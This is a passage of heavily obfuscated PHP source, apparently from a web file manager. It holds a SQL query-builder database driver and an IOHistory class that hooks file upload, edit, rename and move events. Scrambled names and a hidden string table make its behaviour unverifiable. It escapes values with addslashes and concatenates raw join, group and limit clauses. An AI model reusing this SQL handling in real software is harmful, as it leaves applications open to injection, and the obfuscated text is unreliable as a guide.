‘¸ÇÊµ[] = $this->parseKey($³†ŒŞñ¥); } } $ãÖÕú¯Ó = $ ‘¸ÇÊµ; } elseif (is_string($ãÖÕú¯Ó)) { if (strstr($ãÖÕú¯Ó, $Ì¥œ©éˆ[53])) { return $ãÖÕú¯Ó; } $ãÖÕú¯Ó = explode($Ì¥œ©éˆ[50], $ãÖÕú¯Ó); array_walk($ãÖÕú¯Ó, array($this, $Ì¥œ©éˆ[964])); } return $Ì¥œ©éˆ[958] . trim(implode($Ì¥œ©éˆ[1057], $ãÖÕú¯Ó), $Ì¥œ©éˆ[461]) . $Ì¥œ©éˆ[958]; } protected function parseWhere($¿„’–¤Ô) { $…ªè­íû =& $_SERVER[‹è™Ü¸Ñ]; $«ãùå‡ = $…ªè­íû[12]; if (is_string($¿„’–¤Ô)) { $«ãùå‡ = $¿„’–¤Ô; } else { $Üù§Şáâ = isset($¿„’–¤Ô[$…ªè­íû[1058]]) ? strtoupper($¿„’–¤Ô[$…ªè­íû[1058]]) : $…ªè­íû[12]; if (in_array($Üù§Şáâ, array($…ªè­íû[1059], $…ªè­íû[1060], $…ªè­íû[1061]))) { $Üù§Şáâ = $…ªè­íû[53] . $Üù§Şáâ . $…ªè­íû[53]; unset($¿„’–¤Ô[$…ªè­íû[1058]]); } else { $Üù§Şáâ = $…ªè­íû[1062]; } foreach ($¿„’–¤Ô as $™Ë‡É†¨ => $ù¸ğ¹¤å) { $«ãùå‡ .= $…ªè­íû[354]; if (is_numeric($™Ë‡É†¨)) { $™Ë‡É†¨ = $…ªè­íû[1063]; } if (0 === strpos($™Ë‡É†¨, $…ªè­íû[11])) { $«ãùå‡ .= $this->parseThinkWhere($™Ë‡É†¨, $ù¸ğ¹¤å); } else { if (!preg_match($…ªè­íû[1064], trim($™Ë‡É†¨))) { think_exception(think_lang($…ªè­íû[1065]) . $…ªè­íû[4] . $™Ë‡É†¨); } $¿…ÏÔÏû = is_array($ù¸ğ¹¤å) && isset($ù¸ğ¹¤å[$…ªè­íû[1066]]); $™Ë‡É†¨ = trim($™Ë‡É†¨); if (strpos($™Ë‡É†¨, $…ªè­íû[214])) { $ Ş¥øó = explode($…ªè­íû[214], $™Ë‡É†¨); $§ç’õ¥ = array(); foreach ($ Ş¥øó as $ÑîÜÉ‘¹ => $¨Œˆ©) { $˜×Ïá¯ = $¿…ÏÔÏû ? $ù¸ğ¹¤å[$ÑîÜÉ‘¹] : $ù¸ğ¹¤å; $§ç’õ¥[] = $…ªè­íû[337] . $this->parseWhereItem($this->parseKey($¨Œˆ©), $˜×Ïá¯) . $…ªè­íû[963]; } $«ãùå‡ .= implode($…ªè­íû[1067], $§ç’õ¥); } elseif (strpos($™Ë‡É†¨, $…ªè­íû[360])) { $ Ş¥øó = explode($…ªè­íû[360], $™Ë‡É†¨); $§ç’õ¥ = array(); foreach ($ Ş¥øó as $ÑîÜÉ‘¹ => $¨Œˆ©) { $˜×Ïá¯ = $¿…ÏÔÏû ? $ù¸ğ¹¤å[$ÑîÜÉ‘¹] : $ù¸ğ¹¤å; $§ç’õ¥[] = $…ªè­íû[337] . $this->parseWhereItem($this->parseKey($¨Œˆ©), $˜×Ïá¯) . $…ªè­íû[963]; } $«ãùå‡ .= implode($…ªè­íû[1062], $§ç’õ¥); } else { $«ãùå‡ .= $this->parseWhereItem($this->parseKey($™Ë‡É†¨), $ù¸ğ¹¤å); } } $«ãùå‡ .= $…ªè­íû[355] . $Üù§Şáâ; } $«ãùå‡ = substr($«ãùå‡, 0, -strlen($Üù§Şáâ)); } return empty($«ãùå‡) ? $…ªè­íû[12] : $…ªè­íû[1068] . $«ãùå‡; } protected function parseWhereItem($ñÀ£ª÷¬, $áÈØß) { $¹”¢»Ù£ =& $_SERVER[‹è™Ü¸Ñ]; $Õë§ƒ¾ª = $¹”¢»Ù£[12]; if (is_array($áÈØß)) { if (is_string($áÈØß[0])) { $¨¼¨Î½˜ = strtolower($áÈØß[0]); if (in_array($áÈØß[0], array($¹”¢»Ù£[942], $¹”¢»Ù£[1069], $¹”¢»Ù£[1070], $¹”¢»Ù£[1071], $¹”¢»Ù£[1072], $¹”¢»Ù£[1073]))) { $Õë§ƒ¾ª .= $ñÀ£ª÷¬ . $¹”¢»Ù£[53] . $áÈØß[0] . $¹”¢»Ù£[53] . $this->parseValue($áÈØß[1]); } elseif (preg_match($¹”¢»Ù£[1074], $áÈØß[0])) { $Õë§ƒ¾ª .= $ñÀ£ª÷¬ . $¹”¢»Ù£[53] . $this->exp[$¨¼¨Î½˜] . $¹”¢»Ù£[53] . $this->parseValue($áÈØß[1]); } elseif (preg_match($¹”¢»Ù£[1075], $áÈØß[0])) { if (is_array($áÈØß[1])) { $Äù²­˜£ = isset($áÈØß[2]) ? strtoupper($áÈØß[2]) : $¹”¢»Ù£[1060]; if (in_array($Äù²­˜£, array($¹”¢»Ù£[1059], $¹”¢»Ù£[1060], $¹”¢»Ù£[1061]))) { $ó¦¦°¼¡ = array(); foreach ($áÈØß[1] as $¼íé¶¥) { $ó¦¦°¼¡[] = $ñÀ£ª÷¬ . $¹”¢»Ù£[53] . $this->exp[$¨¼¨Î½˜] . $¹”¢»Ù£[53] . $this->parseValue($¼íé¶¥); } $Õë§ƒ¾ª .= $¹”¢»Ù£[337] . implode($¹”¢»Ù£[53] . $Äù²­˜£ . $¹”¢»Ù£[53], $ó¦¦°¼¡) . $¹”¢»Ù£[963]; } } else { $Õë§ƒ¾ª .= $ñÀ£ª÷¬ . $¹”¢»Ù£[53] . $this->exp[$¨¼¨Î½˜] . $¹”¢»Ù£[53] . $this->parseValue($áÈØß[1]); } } elseif ($¹”¢»Ù£[373] == $¨¼¨Î½˜) { $Õë§ƒ¾ª .= $¹”¢»Ù£[961] . $ñÀ£ª÷¬ . $¹”¢»Ù£[53] . $áÈØß[1] . $¹”¢»Ù£[1076]; } elseif (preg_match($¹”¢»Ù£[1077], $áÈØß[0])) { $Õë§ƒ¾ª .= $áÈØß[0]; } elseif (preg_match($¹”¢»Ù£[1078], $áÈØß[0])) { if (isset($áÈØß[2]) && $¹”¢»Ù£[373] == $áÈØß[2]) { $Õë§ƒ¾ª .= $ñÀ£ª÷¬ . $¹”¢»Ù£[53] . $this->exp[$¨¼¨Î½˜] . $¹”¢»Ù£[53] . $áÈØß[1]; } else { if (is_string($áÈØß[1])) { $áÈØß[1] = explode($¹”¢»Ù£[50], $áÈØß[1]); } $’Êï·Ñ¬ = implode($¹”¢»Ù£[50], $this->parseValue($áÈØß[1])); $Õë§ƒ¾ª .= $ñÀ£ª÷¬ . $¹”¢»Ù£[53] . $this->exp[$¨¼¨Î½˜] . $¹”¢»Ù£[961] . $’Êï·Ñ¬ . $¹”¢»Ù£[963]; } } elseif (preg_match($¹”¢»Ù£[1079], $áÈØß[0])) { $ÚÌš¥÷š = is_string($áÈØß[1]) ? explode($¹”¢»Ù£[50], $áÈØß[1]) : $áÈØß[1]; $Õë§ƒ¾ª .= $¹”¢»Ù£[961] . $ñÀ£ª÷¬ . $¹”¢»Ù£[53] . $this->exp[$¨¼¨Î½˜] . $¹”¢»Ù£[53] . $this->parseValue($ÚÌš¥÷š[0]) . $¹”¢»Ù£[1062] . $this->parseValue($ÚÌš¥÷š[1]) . $¹”¢»Ù£[355]; } else { think_exception(think_lang($¹”¢»Ù£[1065]) . $¹”¢»Ù£[4] . $áÈØß[0]); } } else { $Æ‹Ô¸´‹ = count($áÈØß); $ä°Ë™£ã = $¹”¢»Ù£[12]; if (is_string($áÈØß[$Æ‹Ô¸´‹ - 1])) { $ä°Ë™£ã = isset($áÈØß[$Æ‹Ô¸´‹ - 1]) ? strtoupper($áÈØß[$Æ‹Ô¸´‹ - 1]) : $¹”¢»Ù£[12]; if (in_array($ä°Ë™£ã, array($¹”¢»Ù£[1059], $¹”¢»Ù£[1060], $¹”¢»Ù£[1061]))) { $Æ‹Ô¸´‹ = $Æ‹Ô¸´‹ - 1; } } else { $ä°Ë™£ã = $¹”¢»Ù£[1059]; } for ($ãÜŠÏÌÕ = 0; $ãÜŠÏÌÕ < $Æ‹Ô¸´‹; $ãÜŠÏÌÕ++) { $ÚÌš¥÷š = is_array($áÈØß[$ãÜŠÏÌÕ]) ? $áÈØß[$ãÜŠÏÌÕ][1] : $áÈØß[$ãÜŠÏÌÕ]; if ($¹”¢»Ù£[373] == strtolower($áÈØß[$ãÜŠÏÌÕ][0])) { $Õë§ƒ¾ª .= $¹”¢»Ù£[337] . $ñÀ£ª÷¬ . $¹”¢»Ù£[53] . $ÚÌš¥÷š . $¹”¢»Ù£[1076] . $ä°Ë™£ã . $¹”¢»Ù£[53]; } else { $‚”æÕ•á = is_array($áÈØß[$ãÜŠÏÌÕ]) ? $this->exp[strtolower($áÈØß[$ãÜŠÏÌÕ][0])] : $¹”¢»Ù£[942]; if (!$‚”æÕ•á && is_array($áÈØß[$ãÜŠÏÌÕ]) && in_array($áÈØß[$ãÜŠÏÌÕ][0], array($¹”¢»Ù£[942], $¹”¢»Ù£[1069], $¹”¢»Ù£[1070], $¹”¢»Ù£[1071], $¹”¢»Ù£[1072], $¹”¢»Ù£[1073]))) { $‚”æÕ•á = $áÈØß[$ãÜŠÏÌÕ][0]; } $Õë§ƒ¾ª .= $¹”¢»Ù£[337] . $ñÀ£ª÷¬ . $¹”¢»Ù£[53] . $‚”æÕ•á . $¹”¢»Ù£[53] . $this->parseValue($ÚÌš¥÷š) . $¹”¢»Ù£[1076] . $ä°Ë™£ã . $¹”¢»Ù£[53]; } } $Õë§ƒ¾ª = substr($Õë§ƒ¾ª, 0, -4); } } else { $Õë§ƒ¾ª .= $ñÀ£ª÷¬ . $¹”¢»Ù£[1080] . $this->parseValue($áÈØß); } return $Õë§ƒ¾ª; } protected function parseThinkWhere($âóıÇšÇ, $›¤ŞÑŒ) { $¤Ë¹§Ôõ =& $_SERVER[‹è™Ü¸Ñ]; $î”Ö°Â˜ = $¤Ë¹§Ôõ[12]; switch ($âóıÇšÇ) { case $¤Ë¹§Ôõ[428]: $î”Ö°Â˜ = $›¤ŞÑŒ; break; case $¤Ë¹§Ôõ[1063]: $î”Ö°Â˜ = is_string($›¤ŞÑŒ) ? $›¤ŞÑŒ : substr($this->parseWhere($›¤ŞÑŒ), 6); break; case $¤Ë¹§Ôõ[1081]: parse_str($›¤ŞÑŒ, $ü›–ğ£‰); if (isset($ü›–ğ£‰[$¤Ë¹§Ôõ[1058]])) { $µ¿Õ£ôí = $¤Ë¹§Ôõ[53] . strtoupper($ü›–ğ£‰[$¤Ë¹§Ôõ[1058]]) . $¤Ë¹§Ôõ[53]; unset($ü›–ğ£‰[$¤Ë¹§Ôõ[1058]]); } else { $µ¿Õ£ôí = $¤Ë¹§Ôõ[1062]; } $Ëµ¨²ö = array(); foreach ($ü›–ğ£‰ as $í›¬¯À“ => $¢›ŠÏãÎ) { $Ëµ¨²ö[] = $this->parseKey($í›¬¯À“) . $¤Ë¹§Ôõ[1080] . $this->parseValue($¢›ŠÏãÎ); } $î”Ö°Â˜ = implode($µ¿Õ£ôí, $Ëµ¨²ö); break; } return $î”Ö°Â˜; } protected function parseLimit($±Áéïü³) { $éÕ‘–ÍÈ =& $_SERVER[‹è™Ü¸Ñ]; return !empty($±Áéïü³) ? $éÕ‘–ÍÈ[51] . $±Áéïü³ . $éÕ‘–ÍÈ[53] : $éÕ‘–ÍÈ[12]; } protected function parseJoin($ñ“¾é­…) { $şàêˆÇç =& $_SERVER[‹è™Ü¸Ñ]; $Î¢ó«Üƒ = $şàêˆÇç[12]; if (!empty($ñ“¾é­…)) { if (is_array($ñ“¾é­…)) { foreach ($ñ“¾é­… as $±ÙƒêÒ‹ => $‰äşµ±½) { if (!1 !== stripos($‰äşµ±½, $şàêˆÇç[1082])) { $Î¢ó«Üƒ .= $şàêˆÇç[53] . $‰äşµ±½; } else { $Î¢ó«Üƒ .= $şàêˆÇç[1083] . $‰äşµ±½; } } } else { $Î¢ó«Üƒ .= $şàêˆÇç[1083] . $ñ“¾é­…; } } $Î¢ó«Üƒ = preg_replace($şàêˆÇç[1084], think_config($şàêˆÇç[988]) . $şàêˆÇç[1085], $Î¢ó«Üƒ); return $Î¢ó«Üƒ; } protected function parseOrder($„úæÆŞé) { $øÆĞ¤Ãô =& $_SERVER[‹è™Ü¸Ñ]; if (is_array($„úæÆŞé)) { $×Òæáà = array(); foreach ($„úæÆŞé as $Û—ƒ¢šè => $ÇÍ„³™ñ) { if (is_numeric($Û—ƒ¢šè)) { $×Òæáà[] = $this->parseKey($ÇÍ„³™ñ); } else { $ÇÍ„³™ñ = in_array(strtoupper(trim($ÇÍ„³™ñ)), array($øÆĞ¤Ãô[1086], $øÆĞ¤Ãô[1087])) ? $øÆĞ¤Ãô[53] . $ÇÍ„³™ñ : $øÆĞ¤Ãô[12]; if (preg_match($øÆĞ¤Ãô[1088], $Û—ƒ¢šè)) { $×Òæáà[] = $this->parseKey($Û—ƒ¢šè) . $ÇÍ„³™ñ; } else { think_exception($øÆĞ¤Ãô[1089] . $Û—ƒ¢šè); } } } $„úæÆŞé = implode($øÆĞ¤Ãô[50], $×Òæáà); } return !empty($„úæÆŞé) ? $øÆĞ¤Ãô[1090] . $„úæÆŞé : $øÆĞ¤Ãô[12]; } protected function parseGroup($”Æƒ›Í¾) { $ıÊ…å“ =& $_SERVER[‹è™Ü¸Ñ]; return !empty($”Æƒ›Í¾) ? $ıÊ…å“[1091] . $”Æƒ›Í¾ : $ıÊ…å“[12]; } protected function parseHaving($ñ…‹Ô­—) { $³ËÇü· =& $_SERVER[‹è™Ü¸Ñ]; return !empty($ñ…‹Ô­—) ? $³ËÇü·[1092] . $ñ…‹Ô­— : $³ËÇü·[12]; } protected function parseComment($µŒÚ‘¤) { $ÛŞ¨Àà¹ =& $_SERVER[‹è™Ü¸Ñ]; return !empty($µŒÚ‘¤) ? $ÛŞ¨Àà¹[1093] . $µŒÚ‘¤ . $ÛŞ¨Àà¹[1094] : $ÛŞ¨Àà¹[12]; } protected function parseDistinct($Ã‡ìşÅ¡) { $óìØÏøÅ =& $_SERVER[‹è™Ü¸Ñ]; return !empty($Ã‡ìşÅ¡) ? $óìØÏøÅ[1095] : $óìØÏøÅ[12]; } protected function parseUnion($Ó÷ıÇËƒ) { $•ÖÖÌ®” =& $_SERVER[‹è™Ü¸Ñ]; if (empty($Ó÷ıÇËƒ)) { return $•ÖÖÌ®”[12]; } if (isset($Ó÷ıÇËƒ[$•ÖÖÌ®”[424]])) { $üúáã»³ = $•ÖÖÌ®”[1096]; unset($Ó÷ıÇËƒ[$•ÖÖÌ®”[424]]); } else { $üúáã»³ = $•ÖÖÌ®”[1097]; } foreach ($Ó÷ıÇËƒ as $µïüñÆ¨) { $†¯Í¥È…[] = $üúáã»³ . (is_array($µïüñÆ¨) ? $this->buildSelectSql($µïüñÆ¨) : $µïüñÆ¨); } return implode($•ÖÖÌ®”[53], $†¯Í¥È…); } public function insert($Å¿î†ª, $Áœ¯½Ñ’ = array(), $ÂÊ‡á¹¯ = false) { $¬¨¢Ì• =& $_SERVER[‹è™Ü¸Ñ]; $‹¦¨˜ø” = $ÓœÉ´ûù = array(); $this->model = $Áœ¯½Ñ’[$¬¨¢Ì•[358]]; foreach ($Å¿î†ª as $ÌË¼•‡„ => $Ş¹ÖÍñ›) { if (is_array($Ş¹ÖÍñ›) && $¬¨¢Ì•[373] == $Ş¹ÖÍñ›[0]) { $ÓœÉ´ûù[] = $this->parseKey($ÌË¼•‡„); $‹¦¨˜ø”[] = $Ş¹ÖÍñ›[1]; } elseif (is_scalar($Ş¹ÖÍñ›) || is_null($Ş¹ÖÍñ›)) { $ÓœÉ´ûù[] = $this->parseKey($ÌË¼•‡„); $‹¦¨˜ø”[] = $this->parseValue($Ş¹ÖÍñ›); } } $öñ—È£ = ($ÂÊ‡á¹¯ ? $¬¨¢Ì•[965] : $¬¨¢Ì•[966]) . $¬¨¢Ì•[967] . $this->parseTable($Áœ¯½Ñ’[$¬¨¢Ì•[356]]) . $¬¨¢Ì•[961] . implode($¬¨¢Ì•[50], $ÓœÉ´ûù) . $¬¨¢Ì•[962] . implode($¬¨¢Ì•[50], $‹¦¨˜ø”) . $¬¨¢Ì•[963]; $öñ—È£ .= $this->parseLock(isset($Áœ¯½Ñ’[$¬¨¢Ì•[898]]) ? $Áœ¯½Ñ’[$¬¨¢Ì•[898]] : !1); $öñ—È£ .= $this->parseComment(!empty($Áœ¯½Ñ’[$¬¨¢Ì•[430]]) ? $Áœ¯½Ñ’[$¬¨¢Ì•[430]] : $¬¨¢Ì•[12]); return $this->execute($öñ—È£, $this->parseBind(!empty($Áœ¯½Ñ’[$¬¨¢Ì•[361]]) ? $Áœ¯½Ñ’[$¬¨¢Ì•[361]] : array())); } public function selectInsert($Ö­à’’, $œŒæûÃ, $‚£ùı„– = array()) { $Ô¤Õ×ë¡ =& $_SERVER[‹è™Ü¸Ñ]; $this->model = $‚£ùı„–[$Ô¤Õ×ë¡[358]]; if (is_string($Ö­à’’)) { $Ö­à’’ = explode($Ô¤Õ×ë¡[50], $Ö­à’’); } array_walk($Ö­à’’, array($this, $Ô¤Õ×ë¡[964])); $‘Êó¸§¦ = $Ô¤Õ×ë¡[1098] . $this->parseTable($œŒæûÃ) . $Ô¤Õ×ë¡[961] . implode($Ô¤Õ×ë¡[50], $Ö­à’’) . $Ô¤Õ×ë¡[1076]; $‘Êó¸§¦ .= $this->buildSelectSql($‚£ùı„–); return $this->execute($‘Êó¸§¦, $this->parseBind(!empty($‚£ùı„–[$Ô¤Õ×ë¡[361]]) ? $‚£ùı„–[$Ô¤Õ×ë¡[361]] : array())); } public function update($æñ¹µ€³, $Õ‡ıšâÄ) { $ÔÛ¢ïÚ =& $_SERVER[‹è™Ü¸Ñ]; $this->model = $Õ‡ıšâÄ[$ÔÛ¢ïÚ[358]]; $Ô‡ï·á´ = $ÔÛ¢ïÚ[1099] . $this->parseTable($Õ‡ıšâÄ[$ÔÛ¢ïÚ[356]]) . $this->parseSet($æñ¹µ€³) . $this->parseWhere(!empty($Õ‡ıšâÄ[$ÔÛ¢ïÚ[352]]) ? $Õ‡ıšâÄ[$ÔÛ¢ïÚ[352]] : $ÔÛ¢ïÚ[12]) . $this->parseOrder(!empty($Õ‡ıšâÄ[$ÔÛ¢ïÚ[441]]) ? $Õ‡ıšâÄ[$ÔÛ¢ïÚ[441]] : $ÔÛ¢ïÚ[12]) . $this->parseLimit(!empty($Õ‡ıšâÄ[$ÔÛ¢ïÚ[368]]) ? $Õ‡ıšâÄ[$ÔÛ¢ïÚ[368]] : $ÔÛ¢ïÚ[12]) . $this->parseLock(isset($Õ‡ıšâÄ[$ÔÛ¢ïÚ[898]]) ? $Õ‡ıšâÄ[$ÔÛ¢ïÚ[898]] : !1) . $this->parseComment(!empty($Õ‡ıšâÄ[$ÔÛ¢ïÚ[430]]) ? $Õ‡ıšâÄ[$ÔÛ¢ïÚ[430]] : $ÔÛ¢ïÚ[12]); return $this->execute($Ô‡ï·á´, $this->parseBind(!empty($Õ‡ıšâÄ[$ÔÛ¢ïÚ[361]]) ? $Õ‡ıšâÄ[$ÔÛ¢ïÚ[361]] : array())); } public function delete($É£˜ú¯ä = array()) { $¬¥ÅòÙ =& $_SERVER[‹è™Ü¸Ñ]; $this->model = $É£˜ú¯ä[$¬¥ÅòÙ[358]]; $¨ú”çŠ‰ = $¬¥ÅòÙ[1100] . $this->parseTable($É£˜ú¯ä[$¬¥ÅòÙ[356]]) . $this->parseWhere(!empty($É£˜ú¯ä[$¬¥ÅòÙ[352]]) ? $É£˜ú¯ä[$¬¥ÅòÙ[352]] : $¬¥ÅòÙ[12]) . $this->parseOrder(!empty($É£˜ú¯ä[$¬¥ÅòÙ[441]]) ? $É£˜ú¯ä[$¬¥ÅòÙ[441]] : $¬¥ÅòÙ[12]) . $this->parseLimit(!empty($É£˜ú¯ä[$¬¥ÅòÙ[368]]) ? $É£˜ú¯ä[$¬¥ÅòÙ[368]] : $¬¥ÅòÙ[12]) . $this->parseLock(isset($É£˜ú¯ä[$¬¥ÅòÙ[898]]) ? $É£˜ú¯ä[$¬¥ÅòÙ[898]] : !1) . $this->parseComment(!empty($É£˜ú¯ä[$¬¥ÅòÙ[430]]) ? $É£˜ú¯ä[$¬¥ÅòÙ[430]] : $¬¥ÅòÙ[12]); return $this->execute($¨ú”çŠ‰, $this->parseBind(!empty($É£˜ú¯ä[$¬¥ÅòÙ[361]]) ? $É£˜ú¯ä[$¬¥ÅòÙ[361]] : array())); } public function select($´ıÕ–‰ = array()) { $ü¾ÃÈºö =& $_SERVER[‹è™Ü¸Ñ]; $this->model = $´ıÕ–‰[$ü¾ÃÈºö[358]]; $À³”ŒÔã = $this->buildSelectSql($´ıÕ–‰); $úéøç‡â = isset($´ıÕ–‰[$ü¾ÃÈºö[425]]) ? $´ıÕ–‰[$ü¾ÃÈºö[425]] : !1; if ($úéøç‡â) { $’èÒ²˜Ô = is_string($úéøç‡â[$ü¾ÃÈºö[97]]) ? $úéøç‡â[$ü¾ÃÈºö[97]] : $ü¾ÃÈºö[1101] . md5($À³”ŒÔã); $¾¡‘˜À¢ = think_cache($’èÒ²˜Ô, $ü¾ÃÈºö[12], $úéøç‡â); if (!1 !== $¾¡‘˜À¢) { return $¾¡‘˜À¢; } } $Í¬€´ÀÎ = $this->query($À³”ŒÔã, $this->parseBind(!empty($´ıÕ–‰[$ü¾ÃÈºö[361]]) ? $´ıÕ–‰[$ü¾ÃÈºö[361]] : array())); if ($úéøç‡â && !1 !== $Í¬€´ÀÎ) { think_cache($’èÒ²˜Ô, $Í¬€´ÀÎ, $úéøç‡â); } return $Í¬€´ÀÎ; } public function buildSelectSql($È×¤æÏ‘ = array()) { $Á™Êéè‰ =& $_SERVER[‹è™Ü¸Ñ]; if (isset($È×¤æÏ‘[$Á™Êéè‰[429]])) { if (strpos($È×¤æÏ‘[$Á™Êéè‰[429]], $Á™Êéè‰[50])) { list($šßıôúš, $¶•Áİ®è) = explode($Á™Êéè‰[50], $È×¤æÏ‘[$Á™Êéè‰[429]]); } else { $šßıôúš = $È×¤æÏ‘[$Á™Êéè‰[429]]; } $šßıôúš = $šßıôúš ? $šßıôúš : 1; $¶•Áİ®è = isset($¶•Áİ®è) ? $¶•Áİ®è : (is_numeric($È×¤æÏ‘[$Á™Êéè‰[368]]) ? $È×¤æÏ‘[$Á™Êéè‰[368]] : 20); $œÔœ¶ü€ = $¶•Áİ®è * ((int) $šßıôúš - 1); $È×¤æÏ‘[$Á™Êéè‰[368]] = $œÔœ¶ü€ . $Á™Êéè‰[50] . $¶•Áİ®è; } if (think_config($Á™Êéè‰[1102])) { $ÕŸ“’Êè = $Á™Êéè‰[1103] . md5(serialize($È×¤æÏ‘)); $ì‘ì‡äŒ = think_cache($ÕŸ“’Êè); if ($ì‘ì‡äŒ) { return $ì‘ì‡äŒ; } } $Ä¬ª£ÓÈ = $this->parseSql($this->selectSql, $È×¤æÏ‘); $Ä¬ª£ÓÈ .= $this->parseLock(isset($È×¤æÏ‘[$Á™Êéè‰[898]]) ? $È×¤æÏ‘[$Á™Êéè‰[898]] : !1); if (isset($ÕŸ“’Êè)) { think_cache($ÕŸ“’Êè, $Ä¬ª£ÓÈ); } return $Ä¬ª£ÓÈ; } public function parseSql($…±—ÎÎ°, $ü‰ªÉĞ½ = array()) { $†Üˆ•ºû =& $_SERVER[‹è™Ü¸Ñ]; $…±—ÎÎ° = str_replace(array($†Üˆ•ºû[1104], $†Üˆ•ºû[1105], $†Üˆ•ºû[1106], $†Üˆ•ºû[1107], $†Üˆ•ºû[1108], $†Üˆ•ºû[1109], $†Üˆ•ºû[1110], $†Üˆ•ºû[1111], $†Üˆ•ºû[1112], $†Üˆ•ºû[1113], $†Üˆ•ºû[1114]), array($this->parseTable("{$ü‰ªÉĞ½[$†Üˆ•ºû[356]]}"), $this->parseDistinct(isset($ü‰ªÉĞ½[$†Üˆ•ºû[1115]]) ? $ü‰ªÉĞ½[$†Üˆ•ºû[1115]] : !1), $this->parseField(!empty($ü‰ªÉĞ½[$†Üˆ•ºû[350]]) ? $ü‰ªÉĞ½[$†Üˆ•ºû[350]] : $†Üˆ•ºû[220]), $this->parseJoin(!empty($ü‰ªÉĞ½[$†Üˆ•ºû[359]]) ? $ü‰ªÉĞ½[$†Üˆ•ºû[359]] : $†Üˆ•ºû[12]), $this->parseWhere(!empty($ü‰ªÉĞ½[$†Üˆ•ºû[352]]) ? $ü‰ªÉĞ½[$†Üˆ•ºû[352]] : $†Üˆ•ºû[12]), $this->parseGroup(!empty($ü‰ªÉĞ½[$†Üˆ•ºû[578]]) ? $ü‰ªÉĞ½[$†Üˆ•ºû[578]] : $†Üˆ•ºû[12]), $this->parseHaving(!empty($ü‰ªÉĞ½[$†Üˆ•ºû[1116]]) ? $ü‰ªÉĞ½[$†Üˆ•ºû[1116]] : $†Üˆ•ºû[12]), $this->parseOrder(!empty($ü‰ªÉĞ½[$†Üˆ•ºû[441]]) ? $ü‰ªÉĞ½[$†Üˆ•ºû[441]] : $†Üˆ•ºû[12]), $this->parseLimit(!empty($ü‰ªÉĞ½[$†Üˆ•ºû[368]]) ? $ü‰ªÉĞ½[$†Üˆ•ºû[368]] : $†Üˆ•ºû[12]), $this->parseUnion(!empty($ü‰ªÉĞ½[$†Üˆ•ºû[423]]) ? $ü‰ªÉĞ½[$†Üˆ•ºû[423]] : $†Üˆ•ºû[12]), $this->parseComment(!empty($ü‰ªÉĞ½[$†Üˆ•ºû[430]]) ? $ü‰ªÉĞ½[$†Üˆ•ºû[430]] : $†Üˆ•ºû[12])), $…±—ÎÎ°); return $…±—ÎÎ°; } public function getLastSql($ùŸ‡¨âá = '') { return $ùŸ‡¨âá ? $this->modelSql[$ùŸ‡¨âá] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($éÇ‰µ¼) { return addslashes($éÇ‰µ¼); } public function setModel($ºãä×¼) { $this->model = $ºãä×¼; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto dÎ©ñ•–Ó×; A ë»„ñÎŞ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ÒÖ¶üÔ§ =& $_SERVER[‹è™Ü¸Ñ]; $ªóÂäÁœ = $GLOBALS[$ÒÖ¶üÔ§[6]][$ÒÖ¶üÔ§[92]]; if ($ªóÂäÁœ[$ÒÖ¶üÔ§[1281]] != 1) { return; } if ($ªóÂäÁœ[$ÒÖ¶üÔ§[1282]] <= 0) { return; } if (isset($_REQUEST[$ÒÖ¶üÔ§[1283]]) && $_REQUEST[$ÒÖ¶üÔ§[1283]] == $ÒÖ¶üÔ§[91]) { return; } Hook::bind($ÒÖ¶üÔ§[1284], $ÒÖ¶üÔ§[1285]); Hook::bind($ÒÖ¶üÔ§[1286], $ÒÖ¶üÔ§[1287]); Hook::bind($ÒÖ¶üÔ§[1288], $ÒÖ¶üÔ§[1289]); Hook::bind($ÒÖ¶üÔ§[1290], $ÒÖ¶üÔ§[1291]); Hook::bind($ÒÖ¶üÔ§[1292], $ÒÖ¶üÔ§[1293]); Hook::bind($ÒÖ¶üÔ§[1294], $ÒÖ¶üÔ§[1295]); } public static function eventBeforeUpload($’¶“ÄøÛ) { if ($’¶“ÄøÛ[3] && $’¶“ÄøÛ[3] != REPEAT_REPLACE) { return; } $½¢üï‚ = self::parsePath($’¶“ÄøÛ[0]); if (!$½¢üï‚) { return; } self::add($½¢üï‚); } public static function eventBeforeEdit($…”ş¦ßØ) { $«ñß…‚ó = self::parsePath($…”ş¦ßØ[0]); if (!$«ñß…‚ó) { return; } self::add($«ñß…‚ó); } public static function eventBeforeCopyFile($ªßÉÎØ, $®îşÅÓ¦, $¬ÕëóÔ, $ûÕ°à¿Á, $ÄèÂ²ÊŠ, $¶³ĞÍÉ) { $ˆÅãœÌÌ =& $_SERVER[‹è™Ü¸Ñ]; if (isset($¬ÕëóÔ->_data[$ˆÅãœÌÌ[1216]]) && $¬ÕëóÔ->_data[$ˆÅãœÌÌ[1216]]) { return; } $½©‹õ†ª = $¬ÕëóÔ->getPathOuter($ûÕ°à¿Á); $õİß¨Ì£ = self::parsePath($½©‹õ†ª); if (!$õİß¨Ì£) { return; } self::add($õİß¨Ì£); } public static function eventBeforeRename($Õµõ«°„) { $‹ú’¾ñ¯ =& $_SERVER[‹è™Ü¸Ñ]; $ÛÔ’áåõ = self::parsePath($Õµõ«°„[0]); if (!$ÛÔ’áåõ) { return; } $ôèÆ²´ = self::checkInHistory($ÛÔ’áåõ); if (!$ôèÆ²´) { return; } if ($ôèÆ²´[$‹ú’¾ñ¯[33]] == $‹ú’¾ñ¯[230]) { $³±¸¯ÁÙ = self::listData($ÛÔ’áåõ); if ($³±¸¯ÁÙ && $³±¸¯ÁÙ[$‹ú’¾ñ¯[445]]) { self::moveHistory($ÛÔ’áåõ, $Õµõ«°„[1]); } } else { IO::rename($ôèÆ²´[$‹ú’¾ñ¯[87]], $Õµõ«°„[1]); } } public static function eventBeforeMove($çõÃå®Å) { $•¬ŸÄ´± =& $_SERVER[‹è™Ü¸Ñ]; $Ú¤¬ß¡ = self::parsePath($çõÃå®Å[0]); if (!$Ú¤¬ß¡) { return; } $Î·ğ¦¯¦ = self::parsePath($çõÃå®Å[1]); if (!$Î·ğ¦¯¦) { return; } $âƒ½ÑÔö = $çõÃå®Å[3]; $Óˆó’É = self::checkInHistory($Ú¤¬ß¡); if (!$Óˆó’É) { return; } $ÄòÕÃ† = self::pathHistory($Î·ğ¦¯¦); if ($Óˆó’É[$•¬ŸÄ´±[33]] == $•¬ŸÄ´±[230]) { 